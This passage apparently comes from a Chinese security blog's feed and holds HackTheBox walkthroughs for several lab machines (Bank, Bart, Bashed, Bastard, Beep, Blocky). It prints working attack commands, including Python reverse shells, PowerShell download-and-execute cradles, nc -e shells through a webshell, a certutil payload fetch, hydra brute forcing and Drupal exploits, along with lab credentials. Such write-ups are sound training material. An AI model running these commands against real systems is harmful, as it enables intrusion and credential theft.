<p>尝试登录页sql注入，失败，进行http目录枚举</p>
<p><img src="/images/Bank/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>尝试访问<code>.php</code>页面，发现都跳转到了login.php</p>
<p>在<code>balance-transfer</code>下发现了一些有意思的文件</p>
<p><img src="/images/Bank/6.png" alt="6"></p>
<p>许多文件，打开其中一个</p>
<p><img src="/images/Bank/7.png" alt="7"></p>
<p>开头显示加密成功，看来可能是一个可以仔细寻找的东西</p>
<p>使用wget的-r参数进行递归下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r http:&#x2F;&#x2F;bank.htb&#x2F;balance-transfer&#x2F;</span><br></pre></td></tr></table></figure>

<p>之后进行过滤<br>可以根据文件大小过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l|grep -v 584|grep -v 585|grep -v 582|grep -v 583|grep -v 581|grep -v 253503</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bank/8.png" alt="8"></p>
<p>或者根据文件字符数逆排序</p>
<p><img src="/images/Bank/9.png" alt="9"></p>
<p>都会发现一个奇特的文件，而里面存有凭据</p>
<p><img src="/images/Bank/10.png" alt="10"></p>
<p>可以用来登录，之后有文件上传点</p>
<p><img src="/images/Bank/11.png" alt="11"></p>
<p>尝试上传，并进行文件名、content-type、magic-bytes之类的绕过，但是不行<br>再次查看页面，发现提示<code>.htb</code>文件名会被php解析</p>
<p><img src="/images/Bank/12.png" alt="12"></p>
<p>进行修改</p>
<p><img src="/images/Bank/13.png" alt="13"></p>
<p>看来上传成功，上传位置直接显示在页面中</p>
<p><img src="/images/Bank/14.png" alt="14"></p>
<p>获取shell</p>
<p><img src="/images/Bank/15.png" alt="15"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>学习自IppSec</p>
<p>之前访问<code>bank.htb/support.php</code>会返回302，如果细心，burp打开服务器响应拦截，会发现</p>
<p><img src="/images/Bank/16.png" alt="16"></p>
<p>虽然返回了302，但是还返回了一个html页面，修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 OK</span><br></pre></td></tr></table></figure>

<p>这里修改完HTTP报头就不需要再删除<code>Location</code>字段了</p>
<p><img src="/images/Bank/17.png" alt="17"></p>
<p>可以得到同样的结果，之后为了方便，开启burp的匹配</p>
<p><img src="/images/Bank/18.png" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>非常明显</p>
<p>可以修改/etc/passwd</p>
<p><img src="/images/Bank/19.png" alt="19"></p>
<p>或者发现SUID文件</p>
<p><img src="/images/Bank/20.png" alt="20"></p>
<p>执行即可</p>
<p><img src="/images/Bank/21.png" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bart</title>
    <url>/2020/07/01/HTB-Bart/</url>
    <content><![CDATA[<h1 id="Bart"><a href="#Bart" class="headerlink" title="Bart"></a>Bart</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bart/1.jpg" alt="1"></p>
<p>只有80端口</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>访问主页</p>
<p><img src="/images/Bart/2.jpg" alt="2"></p>
<p>发现302跳转forum.bart.htb，也许应该添加到host里，先不急</p>
<p>进行目录枚举</p>
<p><img src="/images/Bart/4.jpg" alt="4"></p>
<p>发现了枚举的目录都会返回200，200页面如下所示</p>
<p><img src="/images/Bart/3.jpg" alt="3"></p>
<p>不过，还是发现了一个存在的页面</p>
<p><img src="/images/Bart/5.jpg" alt="5"></p>
<p>而且发现该站点是wordpress</p>
<p><img src="/images/Bart/6.jpg" alt="6"></p>
<p>添加host</p>
<p><img src="/images/Bart/7.jpg" alt="7"></p>
<p>再次访问</p>
<p><img src="/images/Bart/8.jpg" alt="8"></p>
<p>得到了与之前相同的配置</p>
<p>访问wp默认登录页面</p>
<p><img src="/images/Bart/9.jpg" alt="9"></p>
<p>发现页面不存在，这个站点被修改过了<br>现在卡住了，尝试gobuster扫描，过滤显示HTTP状态码，换一个更大的字典</p>
<p><img src="/images/Bart/10.jpg" alt="10"></p>
<p>现在我们发现了另一个目录</p>
<p><img src="/images/Bart/11.jpg" alt="11"></p>
<p>访问后是一个登录页面<br>有一个忘记密码</p>
<p><img src="/images/Bart/12.jpg" alt="12"></p>
<p>通过它可以暴力枚举用户名，而且该页面的csrftoken不会变</p>
<p>一同操作发现账户秒 <code>harvey/potter</code></p>
<p><img src="/images/Bart/13.jpg" alt="13"></p>
<p>在之前页面的源代码里也能找到提示</p>
<p><img src="/images/Bart/14.jpg" alt="14"></p>
<p>登录后又提示了一个host，修改后再次登录</p>
<p><img src="/images/Bart/15.jpg" alt="15"></p>
<p>登录后又提示了一个host</p>
<p><img src="/images/Bart/16.jpg" alt="16"></p>
<p>访问后又是一个登录框，这次也没有csrf token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l harvey -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt internal-01.bart.htb http-form-post &quot;&#x2F;simple_chat&#x2F;login.php:uname&#x3D;^USER^&amp;passwd&#x3D;^PASS^&amp;submit&#x3D;Login:Invalid Username or Password&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/17.jpg" alt="17"></p>
<p>发现了神奇的现象，很多密码显示正确<br>随便输一个显示正确的密码过去</p>
<p><img src="/images/Bart/18.jpg" alt="18"></p>
<p>发现原来密码有长度限制</p>
<p>我们可以忽略两者共同的错误回显关键词Password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l harvey -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt internal-01.bart.htb http-form-post &quot;&#x2F;simple_chat&#x2F;login.php:uname&#x3D;^USER^&amp;passwd&#x3D;^PASS^&amp;submit&#x3D;Login:Password&quot;</span><br></pre></td></tr></table></figure>

<p>不过这需要很长的时间，我们可以把低于8位的给删掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -nr &#39;&#x2F;^.&#123;8,150&#125;$&#x2F;p&#39; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &gt; pass.txt</span><br></pre></td></tr></table></figure>

<p>不过仍然会遇到这样的问题</p>
<p><img src="/images/Bart/20.jpg" alt="20"></p>
<p>问题在302请求的host变成了10.10.10.81，之后又会跳转到之前任意访问200状态码的页面<br>所以应该在burp配置端口转发(本地80转发10.10.10.81的80)<br>接着添加host匹配</p>
<p><img src="/images/Bart/21.jpg" alt="21"></p>
<p>成功获取密码</p>
<p><img src="/images/Bart/22.jpg" alt="22"></p>
<p>登陆后是一个聊天室<br>查看源码，可以发现一个url</p>
<p><img src="/images/Bart/23.jpg" alt="23"></p>
<p>页面只显示1，不过再次访问1.txt，发现上面输出了http请求的UA，看来是一个日志<br><img src="/images/Bart/24.jpg" alt="24"></p>
<p>我们尝试控制UA输入一段php代码，之后再去包含，发现代码会被执行</p>
<p><img src="/images/Bart/25.jpg" alt="25"></p>
<p>所以写入webshell</p>
<p><img src="/images/Bart/26.jpg" alt="26"></p>
<p><img src="/images/Bart/27.jpg" alt="27"></p>
<p>url编码反弹powershell命令</p>
<p><img src="/images/Bart/28.jpg" alt="28"></p>
<p><img src="/images/Bart/29.jpg" alt="29"></p>
<p>这个日志毒化很有意思，好像我们包含哪个文件 ，哪个文件就会被写入UA，如果不存在就会创建它<br>所以我们第一次访问不会有反馈，再访问一次就会看到上一次的UA信息</p>
<p>成功毒化日志getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>powershell成功，不过我们会遇到一个问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Environment]::Is64BitOperatingSystem</span><br><span class="line">True</span><br><span class="line">[Environment]::Is64BitProcess</span><br><span class="line">False</span><br></pre></td></tr></table></figure>

<p>我们在64位的系统上运行着32位，这会导致一些问题的发生<br>我们可以指定默认路径下的64位powershell反弹链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\windows\sysnative\Windowspowershell\v1.0\powershell.exe iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/31.jpg" alt="31"></p>
<p>成功解决了这个问题<br>但powerup还是不能运行</p>
<p>最后还是用nc链接，解决了这个问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;</span><br></pre></td></tr></table></figure>

<p>具体为什么会这样感觉很迷，浪费了很多时间</p>
<p><img src="/images/Bart/32.jpg" alt="32"></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -c &quot;$user&#x3D; &#39;WORKGROUP\Administrator&#39; ; $pass&#x3D;&#39;3130438f31186fbaf962f407711faddb&#39;; try &#123; Invoke-Command -ScriptBlock &#123; iex(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;) &#125; -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) &#125; catch &#123; echo $_.Exception.Message &#125;&quot; 2&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>本地发现445</p>
<p><img src="/images/Bart/33.jpg" alt="33"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py a &#x2F;root&#x2F;Desktop</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd %temp%</span><br><span class="line">copy \\10.10.16.98\a\plink64.exe</span><br><span class="line">cmd &#x2F;c &quot;echo y|C:\Windows\Temp\plink64.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.98&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/34.jpg" alt="34"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U Administrator &#x2F;&#x2F;127.0.0.1 &quot;cmd.exe&quot;</span><br><span class="line">3130438f31186fbaf962f407711faddb</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bashed</title>
    <url>/2020/06/09/HTB-Bashed/</url>
    <content><![CDATA[<h1 id="Bashed"><a href="#Bashed" class="headerlink" title="Bashed"></a>Bashed</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bashed/2.jpg" alt="2"></p>
<p>只有80端口在开放</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Bashed/3.jpg" alt="3"></p>
<p>web服务貌似是一个靶场</p>
<p><img src="/images/Bashed/1.jpg" alt="1"></p>
<p>就这我进行了目录探测</p>
<p>之后在<code>/dev</code>里发现了webshell</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>执行反向shell连接</p>
<p><img src="/images/Bashed/4.jpg" alt="4"></p>
<p>上面方法都不行，python倒是可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.132&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bashed/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用提权脚本</p>
<p><img src="/images/Bashed/6.jpg" alt="6"></p>
<p>发现可以使用脏牛</p>
<p><img src="/images/Bashed/7.jpg" alt="7"></p>
<p>不过机器上没有gcc</p>
<p>之后我尝试在机器上收集一些信息，发现可以切换到用户scriptmanager，且不需要密码，执行bash -i直接获取交互shell</p>
<p><img src="/images/Bashed/8.jpg" alt="8"></p>
<p>之后在这个账户下，找到了一些拥有w权限的文件</p>
<p><img src="/images/Bashed/9.jpg" alt="9"></p>
<p>我对test.py进行了观察</p>
<p><img src="/images/Bashed/11.jpg" alt="11"></p>
<p>我发现这似乎是一个计划任务，接着我使用<code>pspy</code>对进程进行扫描</p>
<p><img src="/images/Bashed/10.jpg" alt="10"></p>
<p>发现执行者是root，而且我拥有对<code>/scripts</code>文件夹的修改权限，可以添加一个反弹shell由root执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.132&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; &gt; test.py</span><br></pre></td></tr></table></figure>

<p>反弹payload与之前低权限的一样，这样等待一会儿</p>
<p><img src="/images/Bashed/12.jpg" alt="12"></p>
<p>就能获取root权限了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bastard</title>
    <url>/2020/06/10/HTB-Bastard/</url>
    <content><![CDATA[<h1 id="Bastard"><a href="#Bastard" class="headerlink" title="Bastard"></a>Bastard</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bastard/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口在运行drupal</p>
<p>首先可以看看drupal的版本，通过changelog.txt</p>
<p><img src="/images/Bastard/2.jpg" alt="2"></p>
<p>发现版本为7.54，可以运行droopescan进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">droopescan scan drupal -u http:&#x2F;&#x2F;10.10.10.9&#x2F; -t 32</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/3.jpg" alt="3"></p>
<p>不过这个扫描很慢，我的网络还丢包就算了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞</p>
<p><img src="/images/Bastard/4.jpg" alt="4"></p>
<p>7.54可能能用的exp也就这个7.x了</p>
<p><img src="/images/Bastard/5.jpg" alt="5"></p>
<p>这是攻击原理，我们需要修改exp</p>
<p>安装php-curl(根据php -v)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install php7.3-curl</span><br></pre></td></tr></table></figure>

<p>对方url地址、一句话木马</p>
<p><img src="/images/Bastard/6.jpg" alt="6"></p>
<p>执行还是不行，检查后发现路径变了</p>
<p><img src="/images/Bastard/7.jpg" alt="7"></p>
<p><img src="/images/Bastard/8.jpg" alt="8"></p>
<p>还需要修改下exp的路径，(通过目录扫描可以获取)</p>
<p><img src="/images/Bastard/9.jpg" alt="9"></p>
<p>再次执行exp，这次成功了</p>
<p><img src="/images/Bastard/10.jpg" alt="10"></p>
<p>现在可以尝试RCE漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/11.jpg" alt="11"></p>
<p>webshell命令执行成功</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p><img src="/images/Bastard/14.jpg" alt="14"></p>
<p>添加窃取的cookie，可以直接以admin登录</p>
<p><img src="/images/Bastard/15.jpg" alt="15"></p>
<p>之后点击Module→打开PHP filter→save configuration</p>
<p>之后点击</p>
<p><img src="/images/Bastard/16.jpg" alt="16"></p>
<p><img src="/images/Bastard/17.jpg" alt="17"></p>
<p><img src="/images/Bastard/18.jpg" alt="18"></p>
<p>点解下方preview</p>
<p><img src="/images/Bastard/19.jpg" alt="19"></p>
<p>代码执行成功</p>
<h3 id="NC获取shell"><a href="#NC获取shell" class="headerlink" title="NC获取shell"></a>NC获取shell</h3><p>本机开启smb</p>
<p>执行payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;copy%20\\10.10.16.132\a\nc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/12.jpg" alt="12"></p>
<p>再执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;nc%2010.10.16.132%205555%20%20-e%20cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/13.jpg" alt="13"></p>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><p><a href="https://github.com/dreadlocked/Drupalgeddon2">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby drupalgeddon2.rb http:&#x2F;&#x2F;10.10.10.9</span><br></pre></td></tr></table></figure>

<p>期间报错缺少highline</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install highline</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/20.jpg" alt="20"></p>
<p>执行exp</p>
<p><img src="/images/Bastard/21.jpg" alt="21"></p>
<p>中间输入系统命令，输入加载我们反弹powershell的文件即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.123&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>这样就能获取powershell</p>
<h3 id="cve-2018-7600"><a href="#cve-2018-7600" class="headerlink" title="cve-2018-7600"></a>cve-2018-7600</h3><p><a href="https://github.com/pimps/CVE-2018-7600">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install bs4</span><br><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;command&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/22.jpg" alt="22"></p>
<p>所以你可以执行reverse_powershell指令获取powershell</p>
<p><img src="/images/Bastard/23.jpg" alt="23"></p>
<p>或者利用文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.123&#x2F;evil.exe %temp%&#x2F;evil.exe&quot;</span><br><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;C:\Windows\TEMP\evil.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/24.jpg" alt="24"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.123&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/25.jpg" alt="25"></p>
<p>利用MS15-051提权</p>
<p><img src="/images/Bastard/26.jpg" alt="26"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Beep</title>
    <url>/2020/06/11/HTB-Beep/</url>
    <content><![CDATA[<h1 id="Beep"><a href="#Beep" class="headerlink" title="Beep"></a>Beep</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Beep/1.jpg" alt="1"></p>
<p>扫出了很多端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Beep/2.jpg" alt="2"></p>
<p>web服务:elastix</p>
<p><img src="/images/Beep/3.jpg" alt="3"></p>
<p>之后对目录进行扫描</p>
<p><img src="/images/Beep/4.jpg" alt="4"></p>
<p>还发现了FreePBX</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-文件包含"><a href="#方法1-文件包含" class="headerlink" title="方法1:文件包含"></a>方法1:文件包含</h3><p>searchsploit</p>
<p> <img src="/images/Beep/6.jpg" alt="6"></p>
<p>37637.pl</p>
<p><img src="/images/Beep/5.jpg" alt="5"></p>
<p><img src="/images/Beep/7.jpg" alt="7"></p>
<p>发现文件包含成功了，现在读取的<code>/etc/amportal.conf</code> 是FreePBX的配置文件</p>
<p><img src="/images/Beep/8.jpg" alt="8"></p>
<p>我们还可以读取一下<code>/etc/asterisk/manager.conf</code>，这是FreePBX连接asterisk的管理密码</p>
<p><img src="/images/Beep/9.jpg" alt="9"></p>
<p>最后再读取一下/etc/passwd</p>
<p><img src="/images/Beep/10.jpg" alt="10"></p>
<p>获取拥有bash的用户，最后排列组合用户名和获取的密码尝试</p>
<p>期间ssh还遇到了不支持sha1的问题，需要手动开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config												&#x2F;&#x2F;不需要重启</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160			&#x2F;&#x2F;删掉注释</span><br><span class="line">HostkeyAlgorithms ssh-dss,ssh-rsa									&#x2F;&#x2F;末尾添加</span><br><span class="line">KexAlgorithms +diffie-hellman-group1-sha1							&#x2F;&#x2F;末尾添加</span><br></pre></td></tr></table></figure>

<p>最后使用账号/密码<code>root/jEhdIekWmdjE</code>，成功登录，还是root权限</p>
<p><img src="/images/Beep/11.jpg" alt="11"></p>
<h3 id="方法2-RCE"><a href="#方法2-RCE" class="headerlink" title="方法2:RCE"></a>方法2:RCE</h3><p><img src="/images/Beep/12.jpg" alt="12"></p>
<p>Elastix存在RCE漏洞，不过直接运行18650.py会出现SSL证书错误</p>
<p>可以利用burp强制tls转发</p>
<p><img src="/images/Beep/13.jpg" alt="13"></p>
<p>接着使用svwar扫描SIP线路</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install sipvicious</span><br></pre></td></tr></table></figure>

<p><img src="/images/Beep/15.jpg" alt="15"></p>
<p>修改EXP</p>
<p><img src="/images/Beep/14.jpg" alt="14"></p>
<p>之后就可以获取shell</p>
<p><img src="/images/Beep/16.jpg" alt="16"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/Beep/17.jpg" alt="17"></p>
<p>利用nmap提权</p>
<p><img src="/images/Beep/18.jpg" alt="18"></p>
<h3 id="方法3-msf"><a href="#方法3-msf" class="headerlink" title="方法3:msf"></a>方法3:msf</h3><p>使用字典<code>directory-list-2.3-medium.txt</code>发现目录<code>vtigercrm</code>版本5.1.0</p>
<p><img src="/images/Beep/19.jpg" alt="19"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">set RHOSTS 10.10.10.7</span><br><span class="line">set SSL true</span><br><span class="line">set RPORT 443</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p>如果遇到SSL错误，是因为openssl版本太高不支持低版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenSSL::SSL::SSLError SSL_connect returned&#x3D;1 errno&#x3D;0 state&#x3D;error: dh key too small</span><br></pre></td></tr></table></figure>

<p>可以修改/etc/ssl/openssl.cnf，或者像之前一样，用burp转发解决</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = TLSv1<span class="number">.2</span></span><br><span class="line">CipherString = DEFAULT@SECLEVEL=<span class="number">2</span></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = None</span><br><span class="line">CipherString = DEFAULT</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blocky</title>
    <url>/2020/10/22/HTB-Blocky/</url>
    <content><![CDATA[<h1 id="Blocky"><a href="#Blocky" class="headerlink" title="Blocky"></a>Blocky</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blocky/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先检查21端口，它存在一个文件复制(需要登录)、RCE漏洞(需要写webshell)，都无法利用，直接放弃</p>
<p>80端口发现wordpress</p>
<p>目录枚举</p>
<p><img src="/images/Blocky/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对wordpress枚举</p>
<p>用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/2.png" alt="2"></p>
<p>插件枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/3.png" alt="3"></p>
<p>查看之前发现的<code>plugins</code>目录，发现了一些东西(这个URL具有迷惑性，它并不是<code>/wp-content/plugins</code>)</p>
<p><img src="/images/Blocky/5.png" alt="5"></p>
<p>得到两个jar文件，解压它们</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -xvf filename</span><br></pre></td></tr></table></figure>

<p>之后会发现一个文件<code>BlockyCore.class</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file BlockyCore.class </span><br><span class="line">BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8)</span><br></pre></td></tr></table></figure>

<p>使用jad反编译它(下载地址:<a href="http://varaneckas.com/jad/jad158e.linux.static.zip">http://varaneckas.com/jad/jad158e.linux.static.zip</a>)</p>
<p><img src="/images/Blocky/6.png" alt="6"></p>
<p>获取凭据<code>8YsqfCTnvxAUeduzjNSXe22</code></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>密码复用，一键提权</p>
<p><img src="/images/Blocky/7.png" alt="7"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用sql连接凭据登录到phpmyadmin</p>
<p><img src="/images/Blocky/8.png" alt="8"></p>
<p>不需要破解，通过password_hash()，创建一个已知的MD5hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; echo password_hash(&quot;evil&quot;, PASSWORD_DEFAULT);</span><br><span class="line">$2y$10$jdC4&#x2F;HEq5F9l9ISP8r3bA.sFgSGJm0APB1JkND&#x2F;z.6563dqMOo.TK</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/9.png" alt="9"></p>
<p>使用它们登录进wordpress后台，进行getshell</p>
<p><img src="/images/Blocky/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核版本信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-62-generic</span><br><span class="line">Ubuntu 16.04.2 LTS</span><br></pre></td></tr></table></figure>

<p>找到漏洞</p>
<p><img src="/images/Blocky/11.png" alt="11"></p>
<p>传输过去</p>
